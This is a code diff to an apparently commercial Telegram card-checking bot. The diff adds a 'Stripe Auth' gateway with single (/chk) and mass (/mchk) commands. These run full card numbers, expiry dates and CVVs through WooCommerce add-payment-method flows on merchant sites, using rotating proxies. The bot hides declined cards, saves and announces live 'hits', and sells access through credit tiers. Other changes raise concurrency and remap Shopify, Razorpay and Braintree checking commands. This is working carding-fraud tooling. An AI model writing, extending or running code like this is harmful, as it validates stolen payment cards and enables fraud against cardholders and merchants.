+                        status_display = "⚠️ ERROR"
+                        status_category = "error"
+                        print(f"⚠️ ERROR: {msg}")
+                    
+                    return {
+                        "status": "success" if status_category in ["approved", "declined"] else "error",
+                        "result": status,
+                        "message": msg,
+                        "status_display": status_display,
+                        "status_category": status_category,
+                        "elapsed": elapsed,
+                        "price": "$0.00",
+                        "gateway": "Stripe Auth",
+                        "site_used": site_url,
+                        "code": code
+                    }
+                else:
+                    last_msg = msg
+                    last_code = code
+                    
+            except Exception as e:
+                last_msg = str(e)[:120]
+                print(f"⚠️ Site error: {last_msg}")
+                continue
+        
+        elapsed = time.time() - start_time
+        
+        return {
+            "status": "error",
+            "result": last_code,
+            "message": last_msg,
+            "status_display": "⚠️ ERROR",
+            "status_category": "error",
+            "elapsed": elapsed,
+            "price": "$0.00",
+            "gateway": "Stripe Auth",
+            "site_used": ""
+        }
+        
+    except Exception as e:
+        print(f"❌ Error: {e}")
+        traceback.print_exc()
+        default_result["message"] = str(e)[:100]
+        return default_result
+
+
+# ============ FORMAT RESPONSE ============
+
+def format_stripe_chk_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
+    """Format Stripe CHK response for display"""
+    bin_info_text, bank, country, currency_code, country_code = bin_info
+    
+    status_display = result.get("status_display", "⚠️ UNKNOWN")
+    status_category = result.get("status_category", "unknown")
+    message = result.get("message", "Unknown")
+    elapsed = result.get("elapsed", 0)
+    gateway = result.get("gateway", "Stripe Auth")
+    site_used = result.get("site_used", "")
+    price = result.get("price", "$0.00")
+    
+    # Parse card for display
+    card_parts = card.split('|')
+    card_num = card_parts[0] if len(card_parts) > 0 else card
+    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+    
+    # Clean message
+    clean_message = message[:100]
+    if len(message) > 100:
+        clean_message += "..."
+    
+    # Format country with flag
+    country_name = country.replace('🌐', '').strip()
+    flag_map = {
+        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
+        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
+    }
+    country_flag = "🌍"
+    for key, flag in flag_map.items():
+        if key in country_name.upper():
+            country_flag = flag
+            break
+    
+    # Format bank name
+    bank_display = bank if bank != 'N/A' else "Unknown"
+    if len(bank_display) > 25:
+        bank_display = bank_display[:22] + "..."
+    
+    # Determine emoji based on status
+    if status_category == "charged":
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        status_text = "CHARGED"
+    elif status_category == "approved":
+        if "CVV" in status_display or "LIVE" in status_display:
+            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+            status_text = "CVV LIVE"
+        else:
+            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+            status_text = "APPROVED"
+    else:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        status_text = "DECLINED"
+    
+    # Build output
+    ui = (
+        f"┏━━━━━━━⍟\n"
+        f"┃ {status_emoji} {status_text}\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
+        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
+        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
+        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
+        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
+        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
+        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
+        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
+    )
+    
+    return ui, status_category
+
+
+# ============ SINGLE CHECK COMMAND ============
+
+@check_gateway("stripe_chk")
+async def single_check_stripe_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check with Stripe Auth gateway - /chk <card>"""
+    if not await verify_group_access(update, context):
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b>Stripe Auth Single Check</b>\n\n"
+            "Usage: <code>/chk &lt;card&gt;</code>\n"
+            "Example: <code>/chk 4111111111111111|12|2028|123</code>\n\n"
+            "💰 Amount: $0.00 (Free Auth Check)\n"
+            "📍 Gateway: Stripe via WooCommerce Add Payment Method\n"
+            "✅ Checks: CVV Live, Approved, Declined",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    card_text = " ".join(context.args).strip()
+    
+    # Extract card
+    card = card_formatter.extract_single_card_from_text(card_text)
+    if not card:
+        await message.reply_text(
+            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
+            "Example: 4111111111111111|12|2028|123"
+        )
+        return
+    
+    # Check credits
+    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    # Check gateway access
+    if not user_manager.can_access_gateway(user_id, 'stripe_chk'):
+        tier = user_manager.get_tier(user_id)
+        error_message = (
+            f"❌ <b>Stripe Auth not available for {tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎"
+        )
+        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+        add_user_credits(user_id, 1)
+        return
+    
+    stripe_auth_chk_active_tasks[user_id] = True
+    
+    try:
+        tier = user_manager.get_tier(user_id)
+        if user_id not in user_speed_controllers:
+            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[user_id]
+        
+        status_msg = await message.reply_text("🔄 Checking card with Stripe Auth...")
+        
+        await speed_controller.wait_if_needed()
+        start = time.time()
+        
+        # Get proxy if allowed
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+                if proxy_list:
+                    proxy_str = proxy_list[0]
+                    print(f"🔌 Using proxy: {mask_proxy(proxy_str)}")
+        
+        result = await check_card_stripe_chk(card, proxy_str, user_id)
+        
+        elapsed = time.time() - start
+        speed_controller.record_response(elapsed)
+        
+        bin_info = await get_bin_info(card)
+        
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        
+        ui, status_category = format_stripe_chk_response(result, card, bin_info)
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+        
+        if status_category == "approved":
+            await save_hit_to_file(
+                card=card, gateway="Stripe Auth",
+                response=result.get("message", "Approved"),
+                price="$0.00",
+                bin_info=bin_info, user_id=user_id, user_tier=tier
+            )
+            
+            user_data = user_manager.get_user(user_id)
+            await send_hit_notification(
+                context=context, gateway="Stripe Auth", card=card,
+                response=result.get("message", "Approved"),
+                price="$0.00",
+                user=user_data, bin_info=bin_info, status_category="approved"
+            )
+            user_manager.increment_hits(user_id)
+        
+        user_manager.increment_checks(user_id)
+        
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [Stripe CHK] Error: {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+    finally:
+        stripe_auth_chk_active_tasks.pop(user_id, None)
+
+
+# ============ MASS CHECK COMMAND ============
+
+@check_gateway("stripe_chk")
+async def mass_check_stripe_chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass card check with Stripe Auth gateway - /mchk <cards>"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    
+    # Check if user can mass check
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        credits = get_user_credits(user_id) if tier == 'free' else "∞"
+        
+        if tier == 'free' and credits <= 0:
+            error_msg = (
+                f"❌ <b>Insufficient Credits!</b>\n\n"
+                f"🎯 Your balance: <b>0</b> credits\n"
+                f"━━━━━━━━━━━━━━━━━━━\n\n"
+                f"💎 <b>Ways to get credits:</b>\n"
+                f"├─ Redeem a credit key: /redeemcredits &lt;key&gt;\n"
+                f"├─ Upgrade to Premium/Ultimate for unlimited\n"
+                f"└─ Contact @lencax\n\n"
+                f"📝 <b>Commands:</b>\n"
+                f"├─ /credits - Check balance\n"
+                f"├─ /redeemcredits - Add credits\n"
+                f"└─ /buy - Upgrade\n\n"
+                f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
+            )
+            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+            return
+        
+        elif tier == 'free' and credits > 0:
+            error_msg = (
+                f"❌ <b>Mass Check Not Available for FREE Tier</b>\n\n"
+                f"🎯 Your balance: <b>{credits}</b> credits\n"
+                f"━━━━━━━━━━━━━━━━━━━\n\n"
+                f"📌 <b>FREE tier limitations:</b>\n"
+                f"   • Single checks only\n"
+                f"   • Use /chk for single card checks\n\n"
+                f"💎 <b>Upgrade to Premium/Ultimate for:</b>\n"
+                f"   • Mass checks\n"
+                f"   • All gateways\n"
+                f"   • Unlimited credits\n\n"
+                f"USE /buy TO UPGRADE YOUR TIER 💎"
+            )
+            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+            return
+        
+        else:
+            error_msg = f"❌ Mass check not available for {tier.upper()} tier."
+            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+            return
+    
+    # Check gateway access
+    if not user_manager.can_access_gateway(user_id, 'stripe_chk'):
+        tier = user_manager.get_tier(user_id)
+        error_msg = (
+            f"❌ <b>Stripe Auth not available for {tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎"
+        )
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    # Check if reply to file
+    if message.reply_to_message and message.reply_to_message.document:
+        try:
+            file = await message.reply_to_message.document.get_file()
+            content = await file.download_as_bytearray()
+            content = content.decode('utf-8', errors='ignore')
+            
+            cards = []
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    card = card_formatter.extract_single_card_from_text(line)
+                    if card:
+                        cards.append(card)
+            
+            if not cards:
+                await message.reply_text("❌ No valid cards found in file.")
+                return
+                
+            await message.delete()
+            await mass_check_stripe_chk_logic(update, context, cards, None)
+            return
+            
+        except Exception as e:
+            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
+            return
+    
+    if not context.args:
+        await message.reply_text(
+            "📦 <b>Stripe Auth Mass Check</b>\n\n"
+            "Usage: <code>/mchk &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "Or reply to a .txt file with /mchk\n\n"
+            "Example: <code>/mchk 4111111111111111|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
+            "💰 Amount: $0.00 (Free Auth Check)\n"
+            "📍 Gateway: Stripe via WooCommerce Add Payment Method\n"
+            "✅ Only approved cards will be shown",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    cards_text = " ".join(context.args)
+    card_strings = cards_text.split()
+    
+    cards = []
+    for card_str in card_strings:
+        card = card_formatter.extract_single_card_from_text(card_str)
+        if card:
+            cards.append(card)
+    
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+    
+    # Check batch size limit
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
+    
+    # Check credits for mass check
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    try:
+        await message.delete()
+    except:
+        pass
+    
+    await mass_check_stripe_chk_logic(update, context, cards, None)
+
+
+# ============ MASS CHECK LOGIC ============
+
+async def mass_check_stripe_chk_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
+    """Mass check logic for Stripe Auth gateway"""
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+    
+    print(f"\n{'='*80}")
+    print(f"🚀 [STRIPE CHK MASS CHECK] Starting batch for user {u_id}")
+    print(f"📊 Total cards: {total}")
+    print(f"{'='*80}")
+    
+    # Get user's working proxies
+    user_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
+            print(f"🔌 Found {len(user_proxies)} working proxies for rotation")
+    
+    stats = {
+        "approved": 0,
+        "declined": 0,
+        "errors": 0,
+        "total": total,
+        "processed": 0
+    }
+    
+    start_time = time.time()
+    proxy_index = 0
+    
+    try:
+        stripe_auth_chk_active_tasks[u_id] = True
+        
+        tier = user_manager.get_tier(u_id)
+        
+        CONCURRENCY = {
+            "free": 1,
+            "premium": 3,
+            "ultimate": 5,
+            "admin": 10,
+        }.get(tier, 2)
+        
+        if progress_msg is None:
+            progress_text = (
+                f"<b>Gateway</b> ➛ Stripe Auth\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Approved</b> ➛ 0 ✅\n"
+                f"<b>Declined</b> ➛ 0 ❌\n"
+                f"<b>Errors</b> ➛ 0 ⚠️\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
+        
+        if u_id not in user_speed_controllers:
+            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[u_id]
+        
+        semaphore = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed_count = 0
+        
+        async def update_progress(current: int):
+            if current > 0 and current < total and current % 5 != 0:
+                return
+            elapsed = int(time.time() - start_time)
+            minutes = elapsed // 60
+            seconds = elapsed % 60
+            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+            
+            if current >= total:
+                status_text = "FINISHED ✅"
+            else:
+                status_text = f"PROCESSING {current}/{total}"
+            
+            progress_text = (
+                f"<b>Gateway</b> ➛ Stripe Auth\n"
+                f"<b>Status</b> ➛ {status_text}\n"
+                f"<b>Checked</b> ➛ {current}/{total}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} ✅\n"
+                f"<b>Declined</b> ➛ {stats['declined']} ❌\n"
+                f"<b>Errors</b> ➛ {stats['errors']} ⚠️\n"
+                f"<b>Time</b> ➛ {time_str}"
+            )
+            try:
+                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
+            except Exception as e:
+                if "message is not modified" not in str(e).lower():
+                    print(f"⚠️ Progress update error: {e}")
+        
+        async def process_single_card(card: str, idx: int):
+            nonlocal processed_count, proxy_index
+            
+            await asyncio.sleep(random.uniform(0.1, 0.3))
+            
+            async with semaphore:
+                await speed_controller.wait_if_needed()
+                start = time.time()
+                
+                # Get proxy for this card
+                proxy_str = None
+                if user_proxies:
+                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+                
+                result = await check_card_stripe_chk(card, proxy_str, u_id)
+                elapsed = time.time() - start
+                speed_controller.record_response(elapsed)
+                
+                bin_info = await get_bin_info(card)
+                status_category = result.get("status_category", "unknown")
+                
+                async with stats_lock:
+                    processed_count += 1
+                    
+                    if status_category == "approved":
+                        stats["approved"] += 1
+                        print(f"✅ [APPROVED] {card[:20]}...")
+                    elif status_category == "declined":
+                        stats["declined"] += 1
+                        print(f"❌ [DECLINED - HIDDEN] {card[:20]}...")
+                    else:
+                        stats["errors"] += 1
+                        print(f"⚠️ [ERROR] {card[:20]}...")
+                    
+                    if processed_count % 5 == 0 or processed_count == total:
+                        await update_progress(processed_count)
+                
+                # ONLY SEND RESULT FOR APPROVED CARDS
+                if status_category == "approved":
+                    ui, _ = format_stripe_chk_response(result, card, bin_info)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                        print(f"📤 [SENT] {card[:20]}...")
+                    except Exception as e:
+                        print(f"❌ Error sending result: {e}")
+                    
+                    await save_hit_to_file(
+                        card=card, gateway="Stripe Auth",
+                        response=result.get("message", "Approved"),
+                        price="$0.00",
+                        bin_info=bin_info, user_id=u_id, user_tier=tier
+                    )
+                    
+                    user_data = user_manager.get_user(u_id)
+                    await send_hit_notification(
+                        context=context, gateway="Stripe Auth", card=card,
+                        response=result.get("message", "Approved"),
+                        price="$0.00",
+                        user=user_data, bin_info=bin_info, status_category="approved"
+                    )
+                    user_manager.increment_hits(u_id)
+                
+                user_manager.increment_checks(u_id, 1)
+                return result, card
+        
+        # Process all cards
+        tasks = [process_single_card(card, idx) for idx, card in enumerate(cards)]
+        
+        for coro in asyncio.as_completed(tasks):
+            if u_id not in stripe_auth_chk_active_tasks:
+                break
+            try:
+                await coro
+            except Exception as e:
+                print(f"❌ Task error: {e}")
+                async with stats_lock:
+                    stats["errors"] += 1
+        
+        # Final summary
+        if u_id in stripe_auth_chk_active_tasks:
+            total_time = time.time() - start_time
+            minutes = int(total_time // 60)
+            seconds = int(total_time % 60)
+            
+            summary = (
+                f"🏁 <b>Stripe Auth Mass Check Complete</b>\n\n"
+                f"✅ Approved: {stats['approved']}\n"
+                f"❌ Declined: {stats['declined']} (Hidden)\n"
+                f"⚠️ Errors: {stats['errors']}\n"
+                f"📝 Total: {total}\n"
+                f"⏱️ Time: {minutes}m {seconds}s"
+            )
+            
+            await update_progress(total)
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+            print(f"📊 Final summary sent to user {u_id}")
+        
+        return stats
+        
+    except Exception as e:
+        print(f"❌ Stripe CHK mass check error: {e}")
+        traceback.print_exc()
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except:
+            pass
+    finally:
+        stripe_auth_chk_active_tasks.pop(u_id, None)
+        print(f"🏁 [Stripe CHK Mass] Session ended for user {u_id}")
+            
 # ============ RAZORPAY API POOL CONFIGURATION ============
 
 # List of working Razorpay APIs
@@ -40354,13 +42436,15 @@ async def single_check_razorpay(update: Update, context: ContextTypes.DEFAULT_TY
     
     razorpay_active_tasks[user_id] = True
     
+    clock_emoji = premium_emoji(PREMIUM_EMOJI_IDS["clock"], "⏱️")
+    
     try:
         tier = user_manager.get_tier(user_id)
         if user_id not in user_speed_controllers:
             user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
         speed_controller = user_speed_controllers[user_id]
         
-        status_msg = await message.reply_text(f"🔄 Checking...")
+        status_msg = await message.reply_text(f" {clock_emoji} Checking...")
         
         await speed_controller.wait_if_needed()
         start = time.time()
@@ -47006,9 +49090,9 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
         CONCURRENCY = {
             "free": 10,
             "premium": 30,
-            "ultimate": 60,
-            "admin": 60,
-        }.get(tier, 60)
+            "ultimate": 80,
+            "admin": 80,
+        }.get(tier, 80)
         
         # Get user's working proxies
         user_proxies = []
@@ -51465,10 +53549,9 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
     # Map commands to gateways
     gateway_map = {
         # Autosopi (Shopify)
-        '/aumc': 'autosopi',
-        '/aumcheck': 'autosopi',
-        '/auc': 'autosopi',
-        '/shmc': 'autosopi',
+        '/msh': 'autosopi',
+        '/sh': 'shopify',
+
         
         '/mch': 'ezycourse', 
         '/ch': 'ezycourse',
@@ -51484,15 +53567,10 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         '/b3mass': 'b3charged',
         '/b3': 'b3charged',
         
-        # Auto Stripe
-        '/mchk': 'auto_stripe',
-        '/mcheck': 'auto_stripe',
-        '/chk': 'auto_stripe',
+
         
-        # Shopify Mass
-        '/msh': 'shopify',
-        '/mshcheck': 'shopify',
-        '/sh': 'shopify',
+
+        
         
         # New Stripe
         '/nstripem': 'new_stripe',
@@ -51568,6 +53646,12 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         
         '/mbtq': 'boutique',
         '/btq': 'boutique', 
+        
+        '/mchk': 'stripe_chk',
+        '/chk' : 'stripe_chk',
+        
+        '/st': 'st1_gateway',
+        '/mst': 'st1_gateway',
     }
     
     
@@ -51842,6 +53926,10 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         asyncio.create_task(mass_check_stripe_auth0_logic(update, context, cards, progress_msg))
     elif gateway =='boutique':
         asyncio.create_task(mass_check_boutique_logic(update, context, cards, progress_msg))
+    elif gateway =='stripe_chk': 
+        asyncio.create_task(mass_check_stripe_chk_logic(update, context, cards, progress_msg))
+    elif gateway == 'st1_gateway':
+        asyncio.create_task(st1_gateway_mass_check_logic(update, context, cards, progress_msg))
     else:
         await update.message.reply_text(f"❌ Gateway {gateway} not implemented yet.")
     
@@ -53923,7 +56011,7 @@ async def mass_check_shopify(update: Update, context: ContextTypes.DEFAULT_TYPE)
         return
     
     if not context.args:
-        await update.message.reply_text("Usage: /aumc <cards>  or  /aumc <card1> <card2> ...\nExample: /aumc 4111111111111111|12|25|123 4222222222222222|11|24|456")
+        await update.message.reply_text("Usage: /msh  4222222222222222|11|24|456")
         return
     
     user_id = update.effective_user.id
@@ -54132,7 +56220,7 @@ async def mass_check_braintree(update: Update, context: ContextTypes.DEFAULT_TYP
     if not context.args:
         await update.message.reply_text(
             "📦 <b>Autosopi Mass Check</b>\n\n"
-            "Usage: /aumc &lt;cards&gt;  or  /aumcheck &lt;cards&gt;\n\n"
+            "Usage: /msh &lt;cards&gt\n\n"
             "Examples:\n"
             "<code>/aumc 4111111111111111|12|25|123 4222222222222222|11|24|456</code>\n\n"
             "Or with line breaks:\n"
@@ -56797,12 +58885,9 @@ def main():
 
     
     # Autosopi (Shopify)
-    app.add_handler(CommandHandler("auc", single_check_autosopi))
-    app.add_handler(CommandHandler("aumc", aumc_command))
-    
-    # Shopify
+
+    app.add_handler(CommandHandler("msh", aumc_command))
     app.add_handler(CommandHandler("sh", single_check_shopify_pool_command))
-    app.add_handler(CommandHandler("msh", mass_check_shopify_command))
     
     # Stripe Charge V2
 
@@ -57020,8 +59105,7 @@ def main():
     app.add_handler(CommandHandler("gg", single_check_globalgreen))
     app.add_handler(CommandHandler("mgg", mass_check_globalgreen))
     
-    app.add_handler(CommandHandler("st", single_check_stripe_4usd))
-    app.add_handler(CommandHandler("mst", mass_check_stripe_4usd))
+
     
     app.add_handler(CommandHandler("chk0", single_check_stripe_auth0))
     app.add_handler(CommandHandler("mchk0", mass_check_stripe_auth0))
@@ -57045,12 +59129,17 @@ def main():
     app.add_handler(CallbackQueryHandler(stopall_callback_handler, pattern='stopall_cancel'))
     
     app.add_handler(CommandHandler("stop", stop_command))
+    app.add_handler(CommandHandler("chk", single_check_stripe_chk))
+    app.add_handler(CommandHandler("mchk", mass_check_stripe_chk_command))
    
     
     app.add_handler(CommandHandler("massglobalproxy", mass_proxy_global_command))
     
     app.add_handler(CommandHandler("globalmode", toggle_global_mode_command))
     app.add_handler(CommandHandler("globalmode_status", global_mode_status_command))
+    
+    app.add_handler(CommandHandler("st", single_check_st1_gateway))
+    app.add_handler(CommandHandler("mst", mass_check_st1_gateway_command))
     
     
     app.add_handler(MessageHandler(
